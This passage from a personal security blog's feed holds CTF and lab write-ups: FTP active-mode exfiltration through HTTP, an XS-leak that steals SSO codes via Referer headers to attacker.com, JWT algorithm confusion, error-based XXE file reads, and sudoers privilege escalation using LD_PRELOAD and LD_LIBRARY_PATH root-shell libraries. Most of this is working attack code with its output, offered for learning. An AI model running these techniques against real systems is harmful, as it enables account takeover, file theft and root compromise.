\u0026#34;flag.txt\u0026#34;); console.log(\u0026#34;Flag setup complete\u0026#34;); } catch (err) { console.log(err); } client.close(); }; Anonymous login is allowed.\n1 2 3 4 5 # Define a new user having full r/w permissions and a read-only # anonymous user WORKING_DIRECTORY = \u0026#39;/app/data\u0026#39; authorizer.add_user(\u0026#39;ftp\u0026#39;, os.getenv(\u0026#39;ADMIN_FTP_PASSWORD\u0026#39;), WORKING_DIRECTORY, perm=\u0026#39;elradfmwMT\u0026#39;) authorizer.add_anonymous(WORKING_DIRECTORY) We can retrieve flag from the FTP server like this Open a port to listen for connections 1 nc -lvnp 9999 Send these commands to the server\n1 2 3 4 5 USER anonymous PASS EPRT |1|172.21.0.1|9999| RETR flag.txt QUIT Referred: https://ctftime.org/writeup/29641 and https://datatracker.ietf.org/doc/html/rfc2428#section-2 Output: 1 RE:CTF{fakeflag} We can use HTTP to interact with FTP server as long as we have line feeds to separate each command. 1 2 echo \u0026#34;USER anonymous\\r\\nPASS \\r\\nEPRT |1|172.21.0.1|9999|\\r\\nRETR flag.txt\\r\\n\\r\\n\u0026#34; \u0026gt; exploit.txt curl http://172.21.0.2:2121 -F file=@exploit.txt -v --http0.9 Output:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 * upload completely sent off: 268 bytes 220 pyftpdlib based FTP server ready. 500 Command \u0026#34;POST\u0026#34; not understood. 500 Command \u0026#34;HOST:\u0026#34; not understood. 500 Command \u0026#34;USER-AGENT:\u0026#34; not understood. 500 Command \u0026#34;ACCEPT:\u0026#34; not understood. 500 Command \u0026#34;CONTENT-LENGTH:\u0026#34; not understood. 500 Command \u0026#34;CONTENT-TYPE:\u0026#34; not understood. 500 Command \u0026#34;\u0026#34; not understood. 500 Command \u0026#34;--------------------------B2RKR7KWUXQRYGP9ALKGOC\u0026#34; not understood. 500 Command \u0026#34;CONTENT-DISPOSITION:\u0026#34; not understood. 500 Command \u0026#34;CONTENT-TYPE:\u0026#34; not understood. 500 Command \u0026#34;\u0026#34; not understood. 331 Username ok, send password. 230 Login successful. 150 File status okay. About to open data connection. 500 Command \u0026#34;\u0026#34; not understood. 500 Command \u0026#34; \u0026#34; not understood. 500 Command \u0026#34;--------------------------B2RKR7KWUXQRYGP9ALKGOC--\u0026#34; not understood. 200 Active data connection established. Let\u0026rsquo;s try to request using JavaScript. FormData is used so that we can use multipart/form-data. Host this poc.js file 1 2 3 4 5 6 7 8 9 10 // poc.js let xhr = new XMLHttpRequest(); const url = \u0026#39;http://172.21.0.2:2121\u0026#39;; // const url = \u0026#39;http://127.0.0.1:2121\u0026#39;; const content = \u0026#34;USER anonymous\\r\\nPASS \\r\\nEPRT |1|172.21.0.1|7777|\\r\\nRETR flag.txt\\r\\n\\r\\n\u0026#34;; const formData = new FormData(); formData.append(\u0026#34;file\u0026#34;, content); xhr.open(\u0026#34;POST\u0026#34;, url) xhr.send(formData); Open a netcat listener\n1 nc -lvnp 7777 Send the confessions post that can load arbitrary JavaScript file to admin\n1 2 3 4 5 POST /api/report HTTP/1.1 Host: localhost:1337 url=http%3a//web%3a3000/confession/357czf11d-14ea-4777-8d6b-20af42e1f377 Output:\n1 2 connect to [172.21.0.1] from (UNKNOWN) [172.21.0.2] 39105 RE:CTF{fakeflag} It works because all of them is in the same LAN. I wonder how it will work if I only have a domain and no static IP. Can I get the flag from FTP active mode? References Special thanks to the challenge creator for sharing this challenge and solution. References: https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/ https://ctftime.org/writeup/29641 https://slacksite.com/other/ftp.html#actexample https://chromium-review.googlesource.com/c/chromium/src/+/6378605 ","date":"2026-01-17T19:20:49-05:00","permalink":"https://trinuro.github.io/p/reunionctf-2026-writeup-confessions/","title":"ReunionCTF 2026 Writeup - Confessions"},{"content":"Introduction I came across a very interesting question from NiteCTF2025 that leveraged a Chrome 0-day to leak information via the Referer header. This article is best on my best understanding, so it might not be super accurate hehe. Chrome browsers will fetch sub-resources that is defined in the Link header. This is not a vulnerability as the HTTP request to get the sub-resource will not leak any information via the Referer header. It will only show the protocol+hostname+port from my test However, Chrome prior to 131.0.6778.69 respects the referrerpolicy attribute, which we can set to unsafe-url. This cause the entire previous URL (together with the GET parameters) to be leaked in the Referer header of the HTTP request to the sub-resource Very useful if the the previous URL contains the token etc Conditions for successful XS-Leak: Insecure redirect to a vulnerable page in which HTML Injection is achievable img src attribute is controllable Since I did not manage the NiteCTF challenge to get up and running :(, I used this repo instead. P.S. If you need to download previous versions of Chromium browser, you can get the binaries here! Valuable references: https://issues.chromium.org/issues/373263969 https://blog.voorivex.team/leaking-oauth-token-via-referrer-leakage Writeup There is a HTML Injection Vulnerability in referer-override/company.tld/views/dompurify.ejs 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;script\u0026gt; // Extract query parameter from the URL const params = new URLSearchParams(window.location.search); const rawInput = params.get(\u0026#39;input\u0026#39;); if (rawInput) { const cleanHTML = DOMPurify.sanitize(rawInput); document.getElementById(\u0026#39;sanitized-output\u0026#39;).innerHTML = cleanHTML; } else { document.getElementById(\u0026#39;sanitized-output\u0026#39;).textContent = \u0026#34;No input provided.\u0026#34;; } \u0026lt;/script\u0026gt; It is accessible via /dompurify endpoint. Refer referer-override/company.tld/index.js\n1 2 3 app.get(\u0026#39;/dompurify\u0026#39;, (req, res) =\u0026gt; { res.render(\u0026#39;dompurify\u0026#39;); }); The HTML Injection Vulnerability is confirmed. 2. We can get the victim to ping back to our server using img src attribute\n1 http://sso.company.tld/:3001/dompurify?input=%3Cimg%20src=http://attacker.com:8000/x%3E Output:\n1 2 3 4 5 6 7 8 GET /x HTTP/1.1 Host: attacker.com:8000 Connection: keep-alive Accept-Language: en-US,en;q=0.9 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8 Referer: http://localhost:3001/ Accept-Encoding: gzip, deflate To login, we will we need to click on a button which sends us to http://sso.company.tld:3000/authorize?response_type=code\u0026amp;client_id=client1\u0026amp;redirect_uri=http%3A%2F%2Fcompany.tld%3A3001%2Fcallback\u0026amp;state=random-state\u0026amp;scope=openid+profile+email After logging in, if our credentials are correct, the browser will send a callback to the company.tld 1 2 3 GET /callback?code=846f8938465276b3962ede595df25196fff86bab\u0026amp;state=random-state HTTP/1.1 Host: company.tld:3001 Output:\n1 2 3 HTTP/1.1 302 Found Location: /profile Set-Cookie: connect.sid=s%3AQlVtk1c_BPM0t57dS0rPeTxSTigjURsO.1xRX3wc4Fqcj1xMT%2F%2Fac3CV3aGHTbUM06%2BjI%2BvT%2FdAA; Path=/; HttpOnly The redirect_uri is reflected in the response. It is HTML escaped though We can combine it with the HTML Injection vulnerability. It allows us to receive a ping back if a successful login occurred. 1 http://sso.company.tld:3000/authorize?response_type=code\u0026amp;client_id=client1\u0026amp;redirect_uri=http%3A%2F%2Fcompany.tld%3A3001%2Fdompurify?input=%3Cimg%20src=http://attacker.com:8000/x%3E\u0026amp;state=random-state\u0026amp;scope=openid+profile+email Output:\n1 2 3 4 nc -lvnp 8000 GET /x HTTP/1.1 Host: attacker.com:8000 ... Apparently, chrome allows us to fetch sub-resources in the Link header. This version of chrome also allows us to set the referrer-policy via the Link header Our server: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from flask import Flask, request, make_response app = Flask(__name__) # Flask needs the name of the application\u0026#39;s module @app.route(\u0026#34;/abc.png\u0026#34;) # route \u0026#39;decorator\u0026#39; def hello_world(): response = make_response() response.headers[\u0026#34;Link\u0026#34;] = \u0026#39;\u0026lt;http://attacker.com:8000/pwn\u0026gt;;rel=\u0026#34;preload\u0026#34;; as=\u0026#34;image\u0026#34;; referrerpolicy=\u0026#34;unsafe-url\u0026#34;\u0026#39; return response @app.route(\u0026#34;/pwn\u0026#34;) def pwn(): print(request.headers.get(\u0026#34;Referer\u0026#34;)) return \u0026#34;pwned\u0026#34; if __name__ == \u0026#39;__main__\u0026#39;: # Create the web server only if the python module is executed (not imported to another module) app.run(port=8000) # Allow debugging Basically, poc.js but in Python Setting the referrerpolicy=\u0026quot;unsafe-url\u0026quot; is very important because it allows the Referer header to contain more information that just the protocol+host+port (Default policy is Referrer-Policy: strict-origin-when-cross-origin) Our Payload: 1 http://sso.company.tld:3000/authorize?response_type=code\u0026amp;client_id=client1\u0026amp;redirect_uri=http%3A%2F%2Fcompany.tld%3A3001%2Fdompurify?input=%3Cimg%20src=http://attacker.com:8000/abc.png%3E\u0026amp;state=random-state\u0026amp;scope=openid+profile+email Output:\n1 2 3 4 5 * Running on http://127.0.0.1:8000 Press CTRL+C to quit 127.0.0.1 - - [20/Dec/2025 07:08:09] \u0026#34;GET /abc.png HTTP/1.1\u0026#34; 200 - http://company.tld:3001/dompurify?input=%3Cimg%20src%3Dhttp%3A%2F%2Fattacker.com%3A8000%2Fabc.png%3E\u0026amp;code=d9542fae49b37f055da5ad83cec0acc8541a4f33\u0026amp;state=random-state 127.0.0.1 - - [20/Dec/2025 07:08:09] \u0026#34;GET /pwn HTTP/1.1\u0026#34; 200 - The SSO code is leaked P.S. Output if referrer policy is not set 1 2 3 127.0.0.1 - - [20/Dec/2025 07:14:30] \u0026#34;GET /abc.png HTTP/1.1\u0026#34; 200 - http://company.tld:3001/ 127.0.0.1 - - [20/Dec/2025 07:14:30] \u0026#34;GET /pwn HTTP/1.1\u0026#34; 200 - We can use the code to request a valid session cookie 1 2 3 GET /callback?code=d9542fae49b37f055da5ad83cec0acc8541a4f33\u0026amp;state=random-state HTTP/1.1 Host: company.tld:3001 Then we get a ping back from the server ","date":"2025-12-21T09:38:21-05:00","permalink":"https://trinuro.github.io/p/xs-leaks-leveraging-cve-2024-11110/","title":"XS Leaks Leveraging CVE 2024 11110"},{"content":"Here are some cool questions from Curtin CTF 2025. Funny how there is no official writeups. Still waiting for NextJS Challenge Writeup lol\nAgent Jonathan Walkins Trafalgar - JWT Confusion None algo does not work Removing auth part of the JWT does not work This is the public key 1 MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzzh4QcrzhduRn3K1af38WTQMw1QRDjLTjeQKBiQPxyME2piCb+XKUq5WFJOS0VfpDEaSLTJ1W/S662ANgIAy6qw6Y3iovB7C8WwIC1dZ2/5VdKTX8yjoVYaofjzZGKnoHMxoBkELmH7z7GFoNZB4AJ8XSJx1Ibl4f+Y1TtGN+8xhg+2F8KbbuJhHxYiPPoMGxLNyPvay+t0A8Fxf/Qk8LGwxjIN6qnMDCnpZ6MhOj60Poh493EhZ03/1YhGGXE2S0SYm3jOetnueAc4cXxPTOCe4yS8u+pDg89swqlR/sEtO1H99pojRGv1LceD2m93isiLqLqvkJAuvmOJ6z9a9uQIDAQAB I think it is vulnerable to Algorithm Confusion 1 GET /flag?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTc2NTA3OTIzMX0.P_CyhS2vWCrsGLxc_tqGrDpaOLJbJ1Jfmz6sR41NLSA HTTP/1.1 Output:\n1 Invalid signature Instead of Unsupported algorithm First, send the public key to Decoder. The trailing new line is VERY IMPORTANT. Go the JWT Editor tab \u0026gt; New Symmetric Key \u0026gt; Generate. Replace the value of k with the base64 encoded public key Go to jwt.io and Generate an example JWT. Paste the JWT into the webapp and send it to the server. Send the request to repeater and click on JSON Web Token tab. Select the HS256 Signing key we generated earlier. Send the request and we get the flag 1 GET /flag?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTc2NTA3OTIzMX0.z0s9XqALGaYm5AnA-OUS8Kf5bdOW-9HFxDrfJpOFBbk HTTP/1.1 Output:\n1 Welcome Admin! Here is your flag: CURTIN_CTF{alg_c0nfus10n_w1th_publ1c_k3y_1s_c00l} Brailley - Blind XXE This app will send Braille in Number form to the backend. 1 2 POST /api/search HTTP/1.1 {\u0026#34;message\u0026#34;:\u0026#34;1234010123502402340\u0026#34;} Output:\n1 {\u0026#34;ValueSearch\u0026#34;: \u0026#34;Welcome! Our center is located in 8 rue de Londres, 75008 Paris, Opening hours for this center is 10:00-19:00\u0026#34;} I realise that the number corresponds with the Brialle-Number of each character. Space is 0. 1 PARIS =\u0026gt; 1234010123502402340 Let\u0026rsquo;s try to get FLAG 1 2 POST /api/search HTTP/1.1 {\u0026#34;message\u0026#34;:\u0026#34;124012301012450\u0026#34;} Does not work Let\u0026rsquo;s try to read the Braille on the website 1 6012012350102401230123015013456036060234501250150601201230240134501450102340234013501402401023450240135013450 I decided to download the source code to review it. This is the logic of /api/search endpoint. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 @app.route(\u0026#39;/api/search\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def api(): if posted_type == \u0026#39;application/json\u0026#39;: # Verify if it is JSON. # do something # Verify if it is XML. elif posted_type == \u0026#39;application/xml\u0026#39; or posted_type == \u0026#39;text/xml\u0026#39;: try: # Configure the parser to be vulnerable. whatformat = \u0026#34;xml\u0026#34; parser = ET.XMLParser( dtd_validation=True, load_dtd=True, no_network=True, huge_tree=True) tree = ET.parse(StringIO(posted_data), parser) elem = tree.getroot() processed_data = elem.text except ET.ParseError as e: # Display error message. result = e.message # If not JSON or XML. else: result = {\u0026#39;ValueSearch\u0026#39;: \u0026#39;invalid format\u0026#39;} Ok, interesting. This application accepts XML Input too. This is an example valid XML input. 1 2 3 4 5 6 7 8 9 10 11 12 13 POST /api/search HTTP/1.1 Host: curtinctfmy-brailley.chals.io \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE message [ \u0026lt;!ELEMENT message (#PCDATA)\u0026gt; ]\u0026gt; \u0026lt;message\u0026gt;1234010123502402340\u0026lt;/message\u0026gt; There is no direct way for us to exfiltrate file contents so we have to rely on Error-based XXE 1 2 3 except ET.ParseError as e: # Display error message. result = e.message Reference: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#exploiting-error-based-xxe and https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md From the Dockerfile, I noticed some non-traditional installs. 1 2 RUN apt-get install -y -q libreoffice RUN apt-get install -y -q yelp Sure enough, we can read local files with the help of yelp\u0026rsquo;s DTD 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE message [ \u0026lt;!ENTITY % local_dtd SYSTEM \u0026#34;file:///usr/share/yelp/dtd/docbookx.dtd\u0026#34;\u0026gt; \u0026lt;!ENTITY % ISOamsa \u0026#39; \u0026lt;!ENTITY \u0026amp;#x25; file SYSTEM \u0026#34;file:///flag\u0026#34;\u0026gt; \u0026lt;!ENTITY \u0026amp;#x25; eval \u0026#34;\u0026lt;!ENTITY \u0026amp;#x26;#x25; error SYSTEM \u0026amp;#x27;file:///abcxyz/\u0026amp;#x25;file;\u0026amp;#x27;\u0026gt;\u0026#34;\u0026gt; \u0026amp;#x25;eval; \u0026amp;#x25;error; \u0026#39;\u0026gt; %local_dtd; ]\u0026gt; \u0026lt;message\u0026gt;%local_dtd;\u0026lt;/message\u0026gt; Output:\n1 Invalid URI: file:///abcxyz/CURTIN_CTF{‚†û‚†ì‚†º‚†â_‚†º‚†ö‚†ù‚†ë_‚†∫‚†ì‚†ï_‚†ã‚†ë‚†º‚†â‚†á_‚†º‚†Å‚†û_‚†Å‚†á‚†á_‚†∫‚†ä‚†û‚†ì‚†º‚†ö‚†•‚†û_‚†é‚†ë‚†ë‚†º‚†Å‚†ù‚†õ_‚†ä‚†û_‚†º‚†ô‚†á‚†á}, line 4, column 15 Misc 7 - Sticky Bit To find the flag, a simple find will do 1 find / -name *flag* 2\u0026gt;/dev/null Output:\n1 2 3 ... /var/flag/flag ... The permissions of the file 1 -r-------- 1 root root 19 Nov 30 09:15 /var/flag/flag Let\u0026rsquo;s perform cred hunting 1 grep -rn \u0026#34;passw\\|pwd\u0026#34; /etc/* 2\u0026gt;/dev/null Nothing 1 2 3 4 5 6 7 8 9 10 11 12 13 ls -la /etc/cron.*/ /etc/cron.d/: total 12 drwxr-xr-x 2 root root 4096 Oct 13 14:09 . drwxr-xr-x 1 root root 4096 Dec 6 07:45 .. -rw-r--r-- 1 root root 201 Apr 8 2024 e2scrub_all /etc/cron.daily/: total 16 drwxr-xr-x 2 root root 4096 Oct 13 14:09 . drwxr-xr-x 1 root root 4096 Dec 6 07:45 .. -rwxr-xr-x 1 root root 1478 Mar 22 2024 apt-compat -rwxr-xr-x 1 root root 123 Feb 5 2024 dpkg 1 grep -rnw \u0026#34;ssh-rsa\u0026#34; /usr/* 2\u0026gt;/dev/null | grep \u0026#34;:1\u0026#34; Nothing Let\u0026rsquo;s find binaries with sticky bit set. 1 2 3 4 5 6 7 8 9 10 find / -user root -perm -4000 -exec ls -ldb {} \\; 2\u0026gt;/dev/nullev/null -rwsr-xr-x 1 root root 39384 Nov 30 09:15 /etc/security/print -rwsr-xr-x 1 root root 40664 May 30 2024 /usr/bin/newgrp -rwsr-xr-x 1 root root 72792 May 30 2024 /usr/bin/chfn -rwsr-xr-x 1 root root 76248 May 30 2024 /usr/bin/gpasswd -rwsr-xr-x 1 root root 64152 May 30 2024 /usr/bin/passwd -rwsr-xr-x 1 root root 55680 Jun 5 2025 /usr/bin/su -rwsr-xr-x 1 root root 51584 Jun 5 2025 /usr/bin/mount -rwsr-xr-x 1 root root 44760 May 30 2024 /usr/bin/chsh -rwsr-xr-x 1 root root 39296 Jun 5 2025 /usr/bin/umount Ok, after hitting my head and bleeding heavily, I found that /etc/security/print enables us to read stuff as root. It is non-traditional binary with sticky bit set 1 2 3 ctfuser@569cdb1b2a1d:/etc/security$ ./print /var/flag/flag ./print /var/flag/flag CURTIN_CTF{$3tU1D} ","date":"2025-12-21T09:34:22-05:00","permalink":"https://trinuro.github.io/p/curtin-ctf-2025-selected-writeups/","title":"Curtin CTF 2025 Selected Writeups"},{"content":"Background To edit /etc/sudoers, use visudo 1 sudo visudo To verify current sudo configuration, 1 2 3 4 5 6 # Validate sudoers syntax first sudo visudo -c # Force re‚Äëauth then cache credentials sudo -k \u0026amp;\u0026amp; sudo -v # Confirm what the user can do sudo -l sudo -k: Remove current cached credentials sudo -v: Reauthenticate user Default sudo -l A user that is created normally would not be able to run sudo 1 2 sudo useradd normaluser sudo passwd normaluser When we run sudo, 1 2 3 $ sudo -l [sudo] password for normaluser: Sorry, user normaluser may not run sudo on kali. We have to add the user to the sudo group or explicitly define the permissions of the user in order for the user to use sudo This is the default sudoers file in Kali 1 2 3 4 5 6 7 8 sudo cat /etc/sudoers | grep -v \u0026#34;#\\|^$\u0026#34; Defaults env_reset Defaults mail_badpass Defaults secure_path=\u0026#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34; Defaults use_pty root ALL=(ALL:ALL) ALL %sudo ALL=(ALL:ALL) ALL @includedir /etc/sudoers.d env_reset: Means environment variables will be reset. Very important because some commands functions differently based on environment variables mail_badpass: Sends email if there is an authentication error secure_path: Specify the $PATH env variable for root in sudo. Very important because we may be able to change the binary that is actually executed use_pty: Uses a virtual terminal. Helps prevent some attacks root ALL=(ALL:ALL) ALL: Root can run any command as any user and any group %sudo ALL=(ALL:ALL) ALL: The sudo group can run any command as any user and any group Allow user to run all commands as root The easiest way is to add the user to the sudo group 1 sudo usermod -aG sudo normaluser Output: 1 2 3 4 5 6 7 8 9 $ sudo -l [sudo] password for normaluser: Matching Defaults entries for normaluser on kali: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User normaluser may run the following commands on kali: (ALL : ALL) ALL To remove the user from the sudoers group, 1 sudo gpasswd --delete normaluser sudo Allow user to run all commands as another user or group To achieve this, we need to edit the sudoers file directly 1 2 3 # User privilege specification root ALL=(ALL:ALL) ALL normaluser ALL=(kali:kali) ALL In this case, the user normaluser can run commands as user and group kali There is a privilege escalation opportunity if kali is part of sudo groups/ have extra sudo privileges 1 2 3 4 5 6 7 8 9 10 11 12 $ sudo -l Matching Defaults entries for normaluser on kali: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User normaluser may run the following commands on kali: (kali : kali) ALL $ sudo -u kali bash ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/learning_materials/learn_sudoers] ‚îî‚îÄ$ groups kali sudo Allow user to run specific commands as sudo To achieve it, modify the sudoers like this 1 2 3 # User privilege specification root ALL=(ALL:ALL) ALL normaluser ALL=(root:root) /usr/bin/env normaluser can run /usr/bin/env as root Depending on the binary, it can be a privilege escalation vulnerability/opportunity 1 2 3 4 5 6 7 8 9 $sudo -l Matching Defaults entries for normaluser on kali: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User normaluser may run the following commands on kali: (root : root) /usr/bin/env $ sudo env /bin/bash ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali/learning_materials/learn_sudoers] ‚îî‚îÄ# Refer https://gtfobins.github.io/ Allow user to run sudo without password To do so, specify the NOPASSWD rule 1 2 3 # User privilege specification root ALL=(ALL:ALL) ALL normaluser ALL=(root) NOPASSWD: /usr/bin/expect We can now run commands without knowing the password of normaluser. Only use this option in a controlled setting It is usually used in automation scripts Still a privilege escalation opportunity. 1 2 3 4 5 6 7 8 9 10 11 12 $ sudo -l Matching Defaults entries for normaluser on kali: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User normaluser may run the following commands on kali: (root) NOPASSWD: /usr/bin/expect $ sudo /usr/bin/expect -c \u0026#39;spawn /bin/sh;interact\u0026#39; spawn /bin/sh # id uid=0(root) gid=0(root) groups=0(root) Preserve Environment Variables This is an insecure configuration as a lot of binaries works differently based on the presence of certain environment variables and we can preload certain Shared Objects. To preserve environment variables except $PATH, 1 2 3 4 5 6 7 8 Defaults:!normaluser env_reset # ... Defaults:normaluser !env_reset Defaults:normaluser env_delete+=PATH # User privilege specification root ALL=(ALL:ALL) ALL normaluser kali=(root) SETENV: /usr/bin/ls -la Defaults:normaluser: This configuration affects normaluser only !env_reset: Reset environment variables env_delete+=PATH: Don\u0026rsquo;t reset the PATH variable. It prevents other bypasses SETENV is required because Linux does not allow us to set LD_PRELOAD, LD_LIBRARY_PATH or other dangerous variables Output: 1 2 3 4 5 6 7 8 9 $ sudo -l Matching Defaults entries for normaluser on kali: mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, !env_reset, env_delete+=PATH, use_pty User normaluser may run the following commands on kali: (root) SETENV: /usr/bin/ls -la Although ls -la do not have a privilege escalation opportunity, the fact that environment variables are kept allows shared object exploit. First, create a file called root.c 1 2 3 4 5 6 7 8 9 10 11 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; void _init() { unsetenv(\u0026#34;LD_PRELOAD\u0026#34;); // important to prevent infinite loops apparently setgid(0); setuid(0); system(\u0026#34;/bin/bash\u0026#34;); } Compile it as a shared object. 1 gcc -fPIC -shared -o root.so root.c -nostartfiles Then, pass LD_PRELOAD as an environment variable when calling the binary. This loads the SO, which is then executed like any executable. 1 sudo LD_PRELOAD=`pwd`/root.so /usr/bin/ls -la Output: 1 2 $ sudo LD_PRELOAD=`pwd`/root.so /usr/bin/ls -la root@kali:/home/kali/learning_materials/learn_sudoers# Reflection: This is interesting as I swear previously the SETENV flag was not required for this type of privilege escalation Preserve selected Environment Variables To preserve only certain environment variables (safer), 1 2 3 4 Defaults env_reset Defaults:normaluser env_keep+=LD_LIBRARY_PATH # User privilege specification normaluser kali=(root) /home/kali/learning_materials/learn_sudoers/test2 Output: 1 2 3 4 5 6 7 8 $ sudo -l Matching Defaults entries for normaluser on kali: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=LD_LIBRARY_PATH, use_pty User normaluser may run the following commands on kali: (root) /home/kali/learning_materials/learn_sudoers/test2 This configuration is unfortunately still vulnerable to a privilege escalation technique. Identify one of the linked libraries in use. 1 2 3 4 5 $ ldd test2 linux-vdso.so.1 (0x00007f9cff805000) libfoo.so =\u0026gt; not found libc.so.6 =\u0026gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9cff5ea000) /lib64/ld-linux-x86-64.so.2 (0x00007f9cff807000) Compile the previous binary as one of the linked libraries 1 gcc -fPIC -shared -o libfoo.so root.c -nostartfiles Set the Linked library path to the current directory 1 sudo LD_LIBRARY_PATH=`pwd`:$LD_LIBRARY_PATH /home/kali/learning_materials/learn_sudoers/test2 Output: 1 2 3 ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali/learning_materials/learn_sudoers] ‚îî‚îÄ# id uid=0(root) gid=0(root) groups=0(root) Preserve selected Environment Variables 2 To preserve only certain environment variables (safer), 1 2 3 4 Defaults env_reset Defaults:normaluser env_keep+=PATH # User privilege specification normaluser kali=(root) ls -la This configuration is unfortunately still vulnerable to a privilege escalation technique. Create a rootshell binary 1 2 3 4 5 6 7 8 9 10 11 // root.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; void main() { setgid(0); setuid(0); system(\u0026#34;/bin/bash\u0026#34;); } Compile the root shell binary as the allowed binary 1 gcc root_not_so.c -o ls Set the PATH variable 1 2 3 $ PATH=`pwd`:$PATH $ echo $PATH /home/kali/learning_materials/learn_sudoers:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games Execute the sudo command This does not work in the current version of sudo: /etc/sudoers:49:24: expected a fully-qualified path name References Sudoers Manual: https://www.sudo.ws/docs/man/sudoers.man/ Good Medium Post on Sudoers misconfigurations: https://medium.com/@mysticraganork66/why-misconfigured-sudo-is-a-hackers-playground-3e23ab15c889 ","date":"2025-11-09T07:54:25-05:00","permalink":"https://trinuro.github.io/p/becoming-a-super-soldier-common-/etc/sudoers-misconfigurations/","title":"Becoming a Super Soldier (Common /etc/sudoers misconfigurations)"},{"content":"Directory Listing To enable directory listing, go to \u0026lt;root\u0026gt;/conf/web.xml or \u0026lt;root\u0026gt;/webapps/\u0026lt;webapp\u0026gt;/WEB-INF/web.xml 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;default\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;org.apache.catalina.servlets.DefaultServlet\u0026lt;/servlet-class\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;debug\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;0\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;listings\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;true\u0026lt;/param-value\u0026gt; \u0026lt;!--Change this to true--\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;load-on-startup\u0026gt;1\u0026lt;/load-on-startup\u0026gt; \u0026lt;/servlet\u0026gt; To verify this vulnerability, navigate to any directory without index.html. Not Vulnerable To remediate, 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;default\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;org.apache.catalina.servlets.DefaultServlet\u0026lt;/servlet-class\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;debug\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;0\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;listings\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;false\u0026lt;/param-value\u0026gt; \u0026lt;!--Ensure this is false--\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;load-on-startup\u0026gt;1\u0026lt;/load-on-startup\u0026gt; \u0026lt;/servlet\u0026gt; Default Error Page By default, Tomcat serves an error page To verify, go to a non existent path To remediate, use the \u0026lt;error-page\u0026gt; tag. Given this directory structure 1 2 3 4 5 6 7 8 9 10 11 12 13 . ‚îú‚îÄ‚îÄ error ‚îÇ¬†‚îî‚îÄ‚îÄ error.html ‚îú‚îÄ‚îÄ hello.html ‚îî‚îÄ‚îÄ WEB-INF ‚îú‚îÄ‚îÄ classes ‚îÇ¬†‚îú‚îÄ‚îÄ CertServlet.class ‚îÇ¬†‚îú‚îÄ‚îÄ CertServlet.java ‚îÇ¬†‚îú‚îÄ‚îÄ HelloServlet.class 